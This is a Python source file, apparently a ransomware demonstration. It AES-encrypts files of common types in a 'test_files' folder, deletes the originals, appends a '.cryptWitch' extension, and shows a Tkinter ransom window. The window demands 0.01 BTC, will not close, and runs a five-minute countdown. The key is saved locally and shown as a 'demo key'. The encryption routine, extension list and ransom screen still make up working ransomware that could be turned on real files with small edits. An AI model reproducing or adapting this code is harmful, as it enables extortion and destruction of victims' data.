import os
import threading
import time
import sys
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import tkinter as tk
from tkinter import messagebox

# --- CONFIG ---
base_path = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__))

TARGET_FOLDER = os.path.join(base_path, "test_files")
KEY_FILE = os.path.join(base_path, "decryption_key.txt")
BLOCK_SIZE = 16
countdown_time = 300  # 5 minutes

# File extensions to encrypt
ALLOWED_EXTENSIONS = [
    ".txt", ".jpg", ".png", ".pdf", ".docx", ".xlsx", ".csv",
    ".py", ".c", ".cpp", ".html", ".json", ".xml", ".mp3", ".mp4"
]

# --- Padding ---
def pad(data):
    padding_len = BLOCK_SIZE - len(data) % BLOCK_SIZE
    return data + bytes([padding_len]) * padding_len

def unpad(data):
    padding_len = data[-1]
    return data[:-padding_len]

# --- Encrypt one file in-place ---
def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        plaintext = f.read()
    cipher = AES.new(key, AES.MODE_CBC)
    ciphertext = cipher.encrypt(pad(plaintext))
    with open(file_path + ".cryptWitch", 'wb') as f:
        f.write(cipher.iv + ciphertext)
    os.remove(file_path)

# --- Decrypt one file in-place ---
def decrypt_file(file_path, key):
    print(f"[DEBUG] Decrypting: {file_path}")
    with open(file_path, 'rb') as f:
        iv = f.read(16)
        ciphertext = f.read()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext))
    original_path = file_path.replace(".cryptWitch", "")
    with open(original_path, 'wb') as f:
        f.write(plaintext)
    os.remove(file_path)

# --- GUI Popup with Features ---
def show_ransom_gui(real_key):
    decrypted = False

    root = tk.Tk()
    root.title("\U0001F480 Your Files Have Been Encrypted \U0001F480")
    root.geometry("500x420")
    root.configure(bg="black")

    def validate_key():
        nonlocal decrypted
        user_key = entry.get().strip()
        if user_key == real_key.hex():
            try:
                for root_dir, _, files in os.walk(TARGET_FOLDER):
                    for file in files:
                        if file.endswith(".cryptWitch"):
                            decrypt_file(os.path.join(root_dir, file), bytes.fromhex(user_key))
                status_label.config(text="✅ Key is valid → Files Decrypted", fg="green")
                decrypted = True
                unlock_button.config(state=tk.DISABLED)
                root.destroy()
            except Exception as e:
                status_label.config(text=f"❌ Error decrypting files: {e}", fg="red")
        else:
            status_label.config(text="❌ Invalid Key → Try again", fg="red")

    def on_closing():
        if not decrypted:
            messagebox.showwarning("Warning", "🔒 You cannot close this window until files are decrypted.")
        else:
            root.destroy()

    def countdown():
        global countdown_time
        while countdown_time > 0 and not decrypted:
            mins, secs = divmod(countdown_time, 60)
            timer_label.config(text=f"⏳ Time Remaining: {mins:02}:{secs:02}")
            time.sleep(1)
            countdown_time -= 1
        if not decrypted:
            timer_label.config(text="💣 Time Over! Your files are lost! (Simulated)", fg="red")

    root.protocol("WM_DELETE_WINDOW", on_closing)

    tk.Label(root, text="💀 Your Files Have Been Encrypted 💀", fg="red", bg="black",
             font=("Helvetica", 18, "bold")).pack(pady=10)

    tk.Label(root, text="Send 0.01 BTC to the address:", fg="white", bg="black", font=("Arial", 10)).pack()
    tk.Label(root, text="📩 BTC Wallet: 1A2b3C4D5e6F7G8H9I0J...", fg="yellow", bg="black",
             font=("Courier", 12, "bold")).pack(pady=5)

    tk.Label(root, text="Then enter your AES decryption key below:", fg="white", bg="black", font=("Arial", 10)).pack(pady=10)

    tk.Label(root, text=f"(🔐 Demo Key: {real_key.hex()})", fg="cyan", bg="black", font=("Arial", 9, "italic")).pack()

    entry = tk.Entry(root, width=35, font=("Arial", 12))
    entry.pack(pady=10)

    unlock_button = tk.Button(root, text="🔓 Unlock Files", command=validate_key,
                              bg="red", fg="white", font=("Arial", 12, "bold"))
    unlock_button.pack(pady=10)

    status_label = tk.Label(root, text="", fg="white", bg="black", font=("Arial", 11))
    status_label.pack()

    timer_label = tk.Label(root, text="", fg="orange", bg="black", font=("Arial", 11))
    timer_label.pack(pady=10)

    threading.Thread(target=countdown, daemon=True).start()

    root.mainloop()

# --- Main ---
def simulate_ransomware():
    global countdown_time

    real_key = get_random_bytes(16)

    try:
        with open(KEY_FILE, 'w') as f:
            f.write(real_key.hex())
        print(f"[🔐] AES Decryption Key (Demo): {real_key.hex()}")

        for root_dir, _, files in os.walk(TARGET_FOLDER):
            for file in files:
                filepath = os.path.join(root_dir, file)
                ext = os.path.splitext(file)[1].lower()
                if ext in ALLOWED_EXTENSIONS and not file.endswith(".cryptWitch"):
                    encrypt_file(filepath, real_key)

    except Exception as e:
        print(f"[ERROR] Encryption failed: {e}")

    show_ransom_gui(real_key)

if __name__ == "__main__":
    simulate_ransomware()
